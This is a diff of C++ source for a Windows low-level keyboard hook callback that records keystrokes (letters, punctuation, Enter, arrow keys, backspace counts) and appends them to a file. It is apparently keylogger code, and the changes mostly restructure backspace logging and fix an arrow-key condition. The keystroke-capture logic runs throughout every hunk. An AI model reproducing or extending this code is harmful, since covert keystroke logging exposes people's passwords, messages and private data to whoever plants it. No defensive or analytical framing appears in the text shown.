@@ -78,19 +78,26 @@ LRESULT CALLBACK KeyboardEvent(int nCode, WPARAM wParam, LPARAM lParam) {
         int key = hooked_key.vkCode;
 
         if (key >= 0x41 && key <= 0x5a) {//encouter a-z 
+           
             wchar_t c = key;
+            if (back_space > 1) {
+               
+                    wstring space_num = to_wstring(back_space);
+
+
+                    wchar_t str[50] = L"BACKSPACE X";
+                    const  wchar_t* num = space_num.c_str();
+                    wcscat_s(str, num);
+                    wchar_t ab[] = L"\n";
+                    wcscat_s(str, ab);
+                    save_in_file(str);   
+                
+                back_space = 0;
+            }
             if (SHIFT_key) {
                 buf[count_char++] = c; //to upper
             }
-            else if (CTRL_key && key == 0x43) {//ctrl+c  ctrl+x
-                if (OpenClipboard(NULL)) {
-                   
 
-
-                }
-                CloseClipboard();
-
-            }//copy here________________________
 
             //=================================
             else if (CTRL_key && key == 0x56) {//ctrl+v
@@ -123,19 +130,7 @@ LRESULT CALLBACK KeyboardEvent(int nCode, WPARAM wParam, LPARAM lParam) {
 
             else buf[count_char++] = c + 0x20;//to lower
             uni_c = 0;
-            if (back_space > 1) {
-                wstring space_num = to_wstring(back_space);
-
-
-                wchar_t str[50] = L"BACKSPACE X";
-                const  wchar_t* num = space_num.c_str();
-                wcscat_s(str, num);
-                wchar_t ab[] = L"\n";
-                wcscat_s(str, ab);
-                save_in_file(str);
-
-                back_space = 0;
-            }
+          
         }//end a-z
 
             //=============================================
@@ -174,16 +169,19 @@ LRESULT CALLBACK KeyboardEvent(int nCode, WPARAM wParam, LPARAM lParam) {
             buf[count_char++] = c;
             uni_c = 0;
             if (back_space > 1) {
-                wstring space_num = to_wstring(back_space);
+               
+                    wstring space_num = to_wstring(back_space);
 
 
-                wchar_t str[50] = L"BACKSPACE X";
-                const  wchar_t* num = space_num.c_str();
-                wcscat_s(str, num);
-                wchar_t ab[] = L"\n";
-                wcscat_s(str, ab);
-                save_in_file(str);
-
+                    wchar_t str[50] = L"BACKSPACE X";
+                    const  wchar_t* num = space_num.c_str();
+                    wcscat_s(str, num);
+                    wchar_t ab[] = L"\n";
+                    wcscat_s(str, ab);
+                    save_in_file(str);
+                    
+                    
+                
                 back_space = 0;
             }
         }
@@ -192,16 +190,19 @@ LRESULT CALLBACK KeyboardEvent(int nCode, WPARAM wParam, LPARAM lParam) {
             buf[count_char++] = c;
             uni_c = 0;
             if (back_space > 1) {
-                wstring space_num = to_wstring(back_space);
+               
+                    wstring space_num = to_wstring(back_space);
 
 
-                wchar_t str[50] = L"BACKSPACE X";
-                const  wchar_t* num = space_num.c_str();
-                wcscat_s(str, num);
-                wchar_t ab[] = L"\n";
-                wcscat_s(str, ab);
-                save_in_file(str);
+                    wchar_t str[50] = L"BACKSPACE X";
+                    const  wchar_t* num = space_num.c_str();
+                    wcscat_s(str, num);
+                    wchar_t ab[] = L"\n";
+                    wcscat_s(str, ab);
+                    save_in_file(str);
 
+                    
+                
                 back_space = 0;
             }
         }
@@ -209,16 +210,19 @@ LRESULT CALLBACK KeyboardEvent(int nCode, WPARAM wParam, LPARAM lParam) {
             buf[count_char++] = ' ';//encouter spacebar
             uni_c = 0;
             if (back_space > 1) {
-                wstring space_num = to_wstring(back_space);
+                
+                    wstring space_num = to_wstring(back_space);
 
 
-                wchar_t str[50] = L"BACKSPACE X";
-               const  wchar_t* num= space_num.c_str();
-                wcscat_s(str, num);
-                wchar_t ab[] = L"\n";
-                wcscat_s(str, ab);
-                save_in_file(str);
+                    wchar_t str[50] = L"BACKSPACE X";
+                    const  wchar_t* num = space_num.c_str();
+                    wcscat_s(str, num);
+                    wchar_t ab[] = L"\n";
+                    wcscat_s(str, ab);
+                    save_in_file(str);
 
+                    
+                
                 back_space = 0;
             }
         }
@@ -233,16 +237,19 @@ LRESULT CALLBACK KeyboardEvent(int nCode, WPARAM wParam, LPARAM lParam) {
             buf[count_char++] = '*'; //encouter * numlock
             uni_c = 0;
             if (back_space > 1) {
-                wstring space_num = to_wstring(back_space);
+              
+                    wstring space_num = to_wstring(back_space);
 
 
-                wchar_t str[50] = L"BACKSPACE X";
-               const  wchar_t* num= space_num.c_str();
-                wcscat_s(str, num);
-                wchar_t ab[] = L"\n";
-                wcscat_s(str, ab);
-                save_in_file(str);
+                    wchar_t str[50] = L"BACKSPACE X";
+                    const  wchar_t* num = space_num.c_str();
+                    wcscat_s(str, num);
+                    wchar_t ab[] = L"\n";
+                    wcscat_s(str, ab);
+                    save_in_file(str);
 
+                   
+                
                 back_space = 0;
             }
         }
@@ -254,16 +261,19 @@ LRESULT CALLBACK KeyboardEvent(int nCode, WPARAM wParam, LPARAM lParam) {
             else buf[count_char++] = '-';
             uni_c = 0;
             if (back_space > 1) {
-                wstring space_num = to_wstring(back_space);
+               
+                    wstring space_num = to_wstring(back_space);
 
 
-                wchar_t str[50] = L"BACKSPACE X";
-               const  wchar_t* num= space_num.c_str();
-                wcscat_s(str, num);
-                wchar_t ab[] = L"\n";
-                wcscat_s(str, ab);
-                save_in_file(str);
+                    wchar_t str[50] = L"BACKSPACE X";
+                    const  wchar_t* num = space_num.c_str();
+                    wcscat_s(str, num);
+                    wchar_t ab[] = L"\n";
+                    wcscat_s(str, ab);
+                    save_in_file(str);
 
+                   
+                
                 back_space = 0;
             }
         }
@@ -272,16 +282,19 @@ LRESULT CALLBACK KeyboardEvent(int nCode, WPARAM wParam, LPARAM lParam) {
             buf[count_char++] = '+'; //encouter + numlock
             uni_c = 0;
             if (back_space > 1) {
-                wstring space_num = to_wstring(back_space);
+               
+                    wstring space_num = to_wstring(back_space);
 
 
-                wchar_t str[50] = L"BACKSPACE X";
-               const  wchar_t* num= space_num.c_str();
-                wcscat_s(str, num);
-                wchar_t ab[] = L"\n";
-                wcscat_s(str, ab);
-                save_in_file(str);
+                    wchar_t str[50] = L"BACKSPACE X";
+                    const  wchar_t* num = space_num.c_str();
+                    wcscat_s(str, num);
+                    wchar_t ab[] = L"\n";
+                    wcscat_s(str, ab);
+                    save_in_file(str);
 
+                    
+                
                 back_space = 0;
             }
         }
@@ -289,16 +302,19 @@ LRESULT CALLBACK KeyboardEvent(int nCode, WPARAM wParam, LPARAM lParam) {
             buf[count_char++] = '/'; //encouter + numlock
             uni_c = 0;
             if (back_space > 1) {
-                wstring space_num = to_wstring(back_space);
+              
+                    wstring space_num = to_wstring(back_space);
 
 
-                wchar_t str[50] = L"BACKSPACE X";
-               const  wchar_t* num= space_num.c_str();
-                wcscat_s(str, num);
-                wchar_t ab[] = L"\n";
-                wcscat_s(str, ab);
-                save_in_file(str);
+                    wchar_t str[50] = L"BACKSPACE X";
+                    const  wchar_t* num = space_num.c_str();
+                    wcscat_s(str, num);
+                    wchar_t ab[] = L"\n";
+                    wcscat_s(str, ab);
+                    save_in_file(str);
 
+                   
+                
                 back_space = 0;
             }
         }
@@ -306,16 +322,19 @@ LRESULT CALLBACK KeyboardEvent(int nCode, WPARAM wParam, LPARAM lParam) {
             buf[count_char++] = '-'; //encouter + numlock
             uni_c = 0;
             if (back_space > 1) {
-                wstring space_num = to_wstring(back_space);
+               
+                    wstring space_num = to_wstring(back_space);
 
 
-                wchar_t str[50] = L"BACKSPACE X";
-               const  wchar_t* num= space_num.c_str();
-                wcscat_s(str, num);
-                wchar_t ab[] = L"\n";
-                wcscat_s(str, ab);
-                save_in_file(str);
+                    wchar_t str[50] = L"BACKSPACE X";
+                    const  wchar_t* num = space_num.c_str();
+                    wcscat_s(str, num);
+                    wchar_t ab[] = L"\n";
+                    wcscat_s(str, ab);
+                    save_in_file(str);
 
+                   
+                
                 back_space = 0;
             }
         }
@@ -327,16 +346,19 @@ LRESULT CALLBACK KeyboardEvent(int nCode, WPARAM wParam, LPARAM lParam) {
             else buf[count_char++] = '.';
             uni_c = 0;
             if (back_space > 1) {
-                wstring space_num = to_wstring(back_space);
+               
+                    wstring space_num = to_wstring(back_space);
 
 
-                wchar_t str[50] = L"BACKSPACE X";
-               const  wchar_t* num= space_num.c_str();
-                wcscat_s(str, num);
-                wchar_t ab[] = L"\n";
-                wcscat_s(str, ab);
-                save_in_file(str);
+                    wchar_t str[50] = L"BACKSPACE X";
+                    const  wchar_t* num = space_num.c_str();
+                    wcscat_s(str, num);
+                    wchar_t ab[] = L"\n";
+                    wcscat_s(str, ab);
+                    save_in_file(str);
 
+                    
+                
                 back_space = 0;
             }
         }
@@ -348,16 +370,19 @@ LRESULT CALLBACK KeyboardEvent(int nCode, WPARAM wParam, LPARAM lParam) {
             else buf[count_char++] = ',';
             uni_c = 0;
             if (back_space > 1) {
-                wstring space_num = to_wstring(back_space);
+               
+                    wstring space_num = to_wstring(back_space);
 
 
-                wchar_t str[50] = L"BACKSPACE X";
-               const  wchar_t* num= space_num.c_str();
-                wcscat_s(str, num);
-                wchar_t ab[] = L"\n";
-                wcscat_s(str, ab);
-                save_in_file(str);
+                    wchar_t str[50] = L"BACKSPACE X";
+                    const  wchar_t* num = space_num.c_str();
+                    wcscat_s(str, num);
+                    wchar_t ab[] = L"\n";
+                    wcscat_s(str, ab);
+                    save_in_file(str);
 
+                    
+                
                 back_space = 0;
             }
         }
@@ -368,16 +393,19 @@ LRESULT CALLBACK KeyboardEvent(int nCode, WPARAM wParam, LPARAM lParam) {
             else buf[count_char++] = '\\';
             uni_c = 0;
             if (back_space > 1) {
-                wstring space_num = to_wstring(back_space);
+              
+                    wstring space_num = to_wstring(back_space);
 
 
-                wchar_t str[50] = L"BACKSPACE X";
-               const  wchar_t* num= space_num.c_str();
-                wcscat_s(str, num);
-                wchar_t ab[] = L"\n";
-                wcscat_s(str, ab);
-                save_in_file(str);
+                    wchar_t str[50] = L"BACKSPACE X";
+                    const  wchar_t* num = space_num.c_str();
+                    wcscat_s(str, num);
+                    wchar_t ab[] = L"\n";
+                    wcscat_s(str, ab);
+                    save_in_file(str);
 
+                   
+                
                 back_space = 0;
             }
         }
@@ -389,16 +417,19 @@ LRESULT CALLBACK KeyboardEvent(int nCode, WPARAM wParam, LPARAM lParam) {
             else buf[count_char++] = '[';
             uni_c = 0;
             if (back_space > 1) {
-                wstring space_num = to_wstring(back_space);
+               
+                    wstring space_num = to_wstring(back_space);
 
 
-                wchar_t str[50] = L"BACKSPACE X";
-               const  wchar_t* num= space_num.c_str();
-                wcscat_s(str, num);
-                wchar_t ab[] = L"\n";
-                wcscat_s(str, ab);
-                save_in_file(str);
+                    wchar_t str[50] = L"BACKSPACE X";
+                    const  wchar_t* num = space_num.c_str();
+                    wcscat_s(str, num);
+                    wchar_t ab[] = L"\n";
+                    wcscat_s(str, ab);
+                    save_in_file(str);
 
+                   
+                
                 back_space = 0;
             }
         }
@@ -411,16 +442,19 @@ LRESULT CALLBACK KeyboardEvent(int nCode, WPARAM wParam, LPARAM lParam) {
             else buf[count_char++] = ']';
             uni_c = 0;
             if (back_space > 1) {
-                wstring space_num = to_wstring(back_space);
+               
+                    wstring space_num = to_wstring(back_space);
 
 
-                wchar_t str[50] = L"BACKSPACE X";
-               const  wchar_t* num= space_num.c_str();
-                wcscat_s(str, num);
-                wchar_t ab[] = L"\n";
-                wcscat_s(str, ab);
-                save_in_file(str);
+                    wchar_t str[50] = L"BACKSPACE X";
+                    const  wchar_t* num = space_num.c_str();
+                    wcscat_s(str, num);
+                    wchar_t ab[] = L"\n";
+                    wcscat_s(str, ab);
+                    save_in_file(str);
 
+                   
+                
                 back_space = 0;
             }
         }
@@ -433,16 +467,19 @@ LRESULT CALLBACK KeyboardEvent(int nCode, WPARAM wParam, LPARAM lParam) {
             else buf[count_char++] = '`';
             uni_c = 0;
             if (back_space > 1) {
-                wstring space_num = to_wstring(back_space);
+                
+                    wstring space_num = to_wstring(back_space);
 
 
-                wchar_t str[50] = L"BACKSPACE X";
-               const  wchar_t* num= space_num.c_str();
-                wcscat_s(str, num);
-                wchar_t ab[] = L"\n";
-                wcscat_s(str, ab);
-                save_in_file(str);
+                    wchar_t str[50] = L"BACKSPACE X";
+                    const  wchar_t* num = space_num.c_str();
+                    wcscat_s(str, num);
+                    wchar_t ab[] = L"\n";
+                    wcscat_s(str, ab);
+                    save_in_file(str);
 
+                   
+                
                 back_space = 0;
             }
         }
@@ -454,16 +491,19 @@ LRESULT CALLBACK KeyboardEvent(int nCode, WPARAM wParam, LPARAM lParam) {
             else buf[count_char++] = ';';
             uni_c = 0;
             if (back_space > 1) {
-                wstring space_num = to_wstring(back_space);
+               
+                    wstring space_num = to_wstring(back_space);
 
 
-                wchar_t str[50] = L"BACKSPACE X";
-               const  wchar_t* num= space_num.c_str();
-                wcscat_s(str, num);
-                wchar_t ab[] = L"\n";
-                wcscat_s(str, ab);
-                save_in_file(str);
+                    wchar_t str[50] = L"BACKSPACE X";
+                    const  wchar_t* num = space_num.c_str();
+                    wcscat_s(str, num);
+                    wchar_t ab[] = L"\n";
+                    wcscat_s(str, ab);
+                    save_in_file(str);
 
+                   
+                
                 back_space = 0;
             }
         }
@@ -475,16 +515,19 @@ LRESULT CALLBACK KeyboardEvent(int nCode, WPARAM wParam, LPARAM lParam) {
             else buf[count_char++] = '/';
             uni_c = 0;
             if (back_space > 1) {
-                wstring space_num = to_wstring(back_space);
+                
+                    wstring space_num = to_wstring(back_space);
 
 
-                wchar_t str[50] = L"BACKSPACE X";
-               const  wchar_t* num= space_num.c_str();
-                wcscat_s(str, num);
-                wchar_t ab[] = L"\n";
-                wcscat_s(str, ab);
-                save_in_file(str);
+                    wchar_t str[50] = L"BACKSPACE X";
+                    const  wchar_t* num = space_num.c_str();
+                    wcscat_s(str, num);
+                    wchar_t ab[] = L"\n";
+                    wcscat_s(str, ab);
+                    save_in_file(str);
 
+                   
+                
                 back_space = 0;
             }
         }
@@ -496,16 +539,19 @@ LRESULT CALLBACK KeyboardEvent(int nCode, WPARAM wParam, LPARAM lParam) {
             else buf[count_char++] = 0x27;// value of ' in ascii
             uni_c = 0;
             if (back_space > 1) {
-                wstring space_num = to_wstring(back_space);
+                
+                    wstring space_num = to_wstring(back_space);
 
 
-                wchar_t str[50] = L"BACKSPACE X";
-                const  wchar_t* num = space_num.c_str();
-                wcscat_s(str, num);
-                wchar_t ab[] = L"\n";
-                wcscat_s(str, ab);
-                save_in_file(str);
+                    wchar_t str[50] = L"BACKSPACE X";
+                    const  wchar_t* num = space_num.c_str();
+                    wcscat_s(str, num);
+                    wchar_t ab[] = L"\n";
+                    wcscat_s(str, ab);
+                    save_in_file(str);
 
+                   
+                
                 back_space = 0;
             }
         }
@@ -517,31 +563,21 @@ LRESULT CALLBACK KeyboardEvent(int nCode, WPARAM wParam, LPARAM lParam) {
             else buf[count_char++] = '=';// value of ' in ascii
             uni_c = 0;
             if (back_space > 1) {
-                wstring space_num = to_wstring(back_space);
+               
+                    wstring space_num = to_wstring(back_space);
 
 
-                wchar_t str[50] = L"BACKSPACE X";
-               const  wchar_t* num= space_num.c_str();
-                wcscat_s(str, num);
-                wchar_t ab[] = L"\n";
-                wcscat_s(str, ab);
-                save_in_file(str);
+                    wchar_t str[50] = L"BACKSPACE X";
+                    const  wchar_t* num = space_num.c_str();
+                    wcscat_s(str, num);
+                    wchar_t ab[] = L"\n";
+                    wcscat_s(str, ab);
+                    save_in_file(str);
 
+               
                 back_space = 0;
             }
         }
-        //
-        /*
-            else if (CTRL_key) {//encouter CTRL 
-            wchar_t c[] = L" [CTRL] ";
-            buf[++count_char] = '\0';
-            count_char = 0;
-            save_in_file(buf);//save to file
-            save_in_file(c);
-            
-        }
-        */
-
 
         else if (ALT_key) {//encouter ALT 
             wchar_t c[] = L" [ALT ]";
@@ -558,16 +594,19 @@ LRESULT CALLBACK KeyboardEvent(int nCode, WPARAM wParam, LPARAM lParam) {
             count_char = 0;
             save_in_file(buf);//save to file
             if (back_space > 1) {
-                wstring space_num = to_wstring(back_space);
+               
+                    wstring space_num = to_wstring(back_space);
 
 
-                wchar_t str[50] = L"BACKSPACE X";
-                const  wchar_t* num = space_num.c_str();
-                wcscat_s(str, num);
-                wchar_t ab[] = L"\n";
-                wcscat_s(str, ab);
-                save_in_file(str);
+                    wchar_t str[50] = L"BACKSPACE X";
+                    const  wchar_t* num = space_num.c_str();
+                    wcscat_s(str, num);
+                    wchar_t ab[] = L"\n";
+                    wcscat_s(str, ab);
+                    save_in_file(str);
 
+                   
+                
                 back_space = 0;
             }
         }//enter
@@ -595,20 +634,25 @@ LRESULT CALLBACK KeyboardEvent(int nCode, WPARAM wParam, LPARAM lParam) {
         if (count_char > 0) {
             save_in_file(buf);
             count_char = 0;
+           
             }
         if (back_space > 1) {
-            wstring space_num = to_wstring(back_space);
+           
+                wstring space_num = to_wstring(back_space);
 
 
-            wchar_t str[50] = L"BACKSPACE X";
-            const  wchar_t* num = space_num.c_str();
-            wcscat_s(str, num);
-            wchar_t ab[] = L"\n";
-            wcscat_s(str, ab);
-            save_in_file(str);
+                wchar_t str[50] = L"BACKSPACE X";
+                const  wchar_t* num = space_num.c_str();
+                wcscat_s(str, num);
+                wchar_t ab[] = L"\n";
+                wcscat_s(str, ab);
+                save_in_file(str);
+                back_space = 0;
+            
 
-            back_space = 0;
         }
+       
+ 
         switch (key){
         case VK_UP: {
             wchar_t c[] = L"UP ARROW key\n ";
@@ -627,14 +671,16 @@ LRESULT CALLBACK KeyboardEvent(int nCode, WPARAM wParam, LPARAM lParam) {
          }//end if VK_UP
 
 
-        else if (key == VK_LEFT || key == VK_LEFT) {
+        else if (key == VK_RIGHT || key == VK_LEFT) {
         if (count_char > 0) {
             save_in_file(buf);
             count_char = 0;
+           
         }
-
-        switch (key) {
-            if (back_space > 1) {
+       
+        if (back_space > 1) {
+            
+            
                 wstring space_num = to_wstring(back_space);
 
 
@@ -644,9 +690,14 @@ LRESULT CALLBACK KeyboardEvent(int nCode, WPARAM wParam, LPARAM lParam) {
                 wchar_t ab[] = L"\n";
                 wcscat_s(str, ab);
                 save_in_file(str);
+               back_space = 0;
+            
+           
+        }
+       
 
-                back_space = 0;
-            }
+        switch (key) {
+
         case VK_LEFT: {
             wchar_t c[] = L"LEFT ARROW key\n ";
             save_in_file(c);
